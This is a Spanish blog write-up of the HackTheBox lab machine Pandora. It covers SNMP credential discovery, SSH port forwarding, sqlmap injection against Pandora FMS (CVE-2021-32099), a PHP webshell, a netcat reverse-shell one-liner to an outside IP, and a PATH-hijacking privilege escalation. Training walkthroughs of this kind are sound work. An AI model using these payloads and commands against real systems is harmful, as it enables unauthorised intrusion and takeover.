Pandora HackTheBox

T3sla 30 Oct 2022

Bienvenidos, este es el primer writeup del blog, el cual tratara la resolución de la máquina Pandora.

Sin más que agregar comencemos.

Información sobre la máquina

Esta máquina tiene dificultad fácil, pero desde mi punto de vista no es una máquina fácil.
Una máquina bastante divertida donde se tocan bastantes tópicos y como información extra sin relevancia es mi máquina favorita.

Matrix

  • SQLI
  • SNMP
  • UDP
  • PATH Hijacking
  • CVE-2021-32099
  • Local Port Forwarding

Reconocimiento

Nmap (TCP - UDP)

nmap -sSU --min-rate 12000 -Pn -n -p- --open -v 10.10.11.136
nmap -sS -sCV -n -p 22,80 -T5 -Pn -n -v 10.10.11.136
nmap -sU -sCV -n -p 161 -T5 -Pn -v 10.10.11.136

Podríamos emplear la típica metodología de buscar algún exploit público que afecte a alguna versión de los servicios, pero lamentablemente no se obtiene nada.
Lo que más llama la atención es el servicio SNMP y su versión (v1) y que el «comunity string» está establecido como publico (luego le damos una vuelta).

Servidor Web

El servidor web almacena una página web estática en la cual no podemos hacer mucho, pero si nos fijamos en la descripción obtenemos lo que parece ser un dominio panda.htb.
Procedemos a agregar el dominio al /etc/hosts.

vim /etc/hosts

Ya estaría haciendo la resolución DNS, podríamos hacer una búsqueda de subdominios, pero adelanto que los tiros no van por ahí.

SNMP

Nos queda el protocolo simple de administración de red porque en los otros servicios no hemos encontrado nada interesante o útil.
Recordando un poco, el comunity string estaba establecido como “public” lo cual sería una especie de “usuario” en el cual no debemos proporcionar ningún tipo de credencial y a través de esto podemos recopilar diferente información acerca del equipo.

Haciendo uso de la herramienta snmpwalk nos podemos aprovechar de esta mala configuración (hay otras herramientas que se pueden emplear para el mismo propósito).

snmpwalk -v 2c  -c public 10.10.11.136

Podemos recopilar bastante información del sistema operativo como la versión del KERNEL de LINUX, Usuarios y hasta procesos.

Genial logramos obtener un usuario (Daniel) por lo cual enviaré la salida del comando a un fichero y luego poder filtrar a través de GREP.

snmpwalk -v 2c -c public 10.10.11.136 > snmp

Filtrando con grep y entregando como parámetro la string “daniel” podemos encontrar credenciales.

cat snmp | grep -i "daniel " || grep -i "daniel" snmp

Intrusión

Vamos a verificar que las credenciales obtenidas sean válidas, para esto nos conectaremos al servicio SSH.

Genial.

Ahora vamos a enumerar el sistema.

Hay otro usuario el cual tiene el flag, pero nuestro usuario no posee los permisos necesarios para poder leer el contenido.

Al listar el directorio /var/www/ encontramos el sitio y una aplicación web la cual no podemos acceder.

Para obtener mayores pruebas de que los tiros van por la aplicación web decidí ver los servicios que tenía el sistema operativo corriendo y en escucha vía el protocolo TCP y me lleve una gran sorpresa al encontrar el servicio MySQL.

netstat -lt

(También reviso si el demonio de MySQL está activo más que nada para una doble comprobación)

Para poder acceder a la aplicación web vamos a estar empleando una técnica la cual se suele utilizar bastante al momento de hacer pivoting.

Esta técnica consiste en traer los servicios que corren en la máquina de manera local y que no están expuestos hacia nuestra máquina (una explicación bastante simple y pobre).

Para ello ejecutamos el siguiente comando:

ssh -L 1313:localhost:80 daniel@panda.htb

PuertoLocal:localhost:PuertoRemoto Host

Explotación

Ya tenemos acceso a la aplicación web.

En el footer nos encontramos la versión, procedo a hacer una búsqueda de dicha versión en busca de alguna vulnerabilidad.
Genial tiene varios CVE’s que afectan a esta versión y hay un blog que explica de manera técnica las vulnerabilidades.

Una de las vulnerabilidades que más llama la atención es la inyección SQL, la cual se puede explotar sin estar autenticado en el aplicativo.

En el fichero /include/chart_generator.php se encuentra el parámetro vulnerable session_id.

Por lo cual la explotación de esta vulnerabilidad es relativamente fácil, estaré utilizando la herramienta SQLMAP para poder explotar esta vulnerabilidad, ya que aún no sé explotar una inyección SQL de forma manual.

sqlmap --url "http://localhost:1313/pandora_console/include/chart_generator.php?session_id=" --random-agent -o --level=5 --risk=3 --method="GET" --cookie="jm3i5g44ifdfl3417p9gnh9nur" --dbms=mysql --tamper=space2comment --dbs


sqlmap --url "http://localhost:1313/pandora_console/include/chart_generator.php?session_id=" --random-agent -o --level=5 --risk=3 --method="GET" --cookie="jm3i5g44ifdfl3417p9gnh9nur" --dbms=mysql -D pandora --tables

Ahora listamos las tablas que contiene la base de datos “Pandora”.

Debemos encontrar la cookie de administrador y así poder hacer bypass al panel de administración, luego de buscar encontré la tabla tsessions_php.

Ahora solo hay que encontrar el valor correcto de la sesión del administrador (pero tuve un problema, no daba con la sesión de dicho administrador y probé todos los valores, así que tuve que buscar si había algún tipo de PoC en GitHub y sí).

El siguiente repositorio contiene la sentencia SQL maliciosa con la cual roba el valor de la cookie del administrador.

Genial.

WebShell & ReverseShell

Ahora necesitamos poder ejecutar comandos a nivel de sistema, por lo cual subiremos una webshell y posteriormente nos enviaremos una reverse shell.

<?php system($_GET['cmd']); ?>


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.121 1212 >/tmp/f
nc -lvnp 1212

Podemos leer el flag.

Escalada de privilegios

Empezaremos con la típica enumeración de sistema para escalar privilegios.

No hay nada en Crontabs.

Al momento de ver los binarios SUID obtenemos el siguiente resultado:

Un binario nada común en sistemas GNU/LINUX.

Si ejecutamos el binario obtenemos esta salida.

Al parecer ejecuta el comando tar apuntando a descomprimir un respaldo.

PATH HIJACKING

Daré una breve y simple definición de lo que es esta técnica.

El PATH HIJACKING no es más que engañar de alguna forma la ruta de ejecución de un binario en GNU/LINUX gracias a la variable de entorno $PATH que almacena la mayoría de rutas donde se encuentra los ejecutables.
Un ejemplo de esto sería el siguiente:
Si yo quiero ejecutar el binario cat, ira recorriendo la asignación de la variable de entorno $PATH hasta encontrar la ruta correcta, es ahí donde nosotros nos podemos aprovechar y agregar una ruta personalizada y así ejecutar nuestro ejecutable "malicioso" y no el legítimo.


PoC

echo "/bin/bash" > tar && chmod +x tar && ls -l tar && echo $PATH && export PATH=.:$PATH && /usr/bin/pandora_backup

Listo ahora podemos leer el flag.
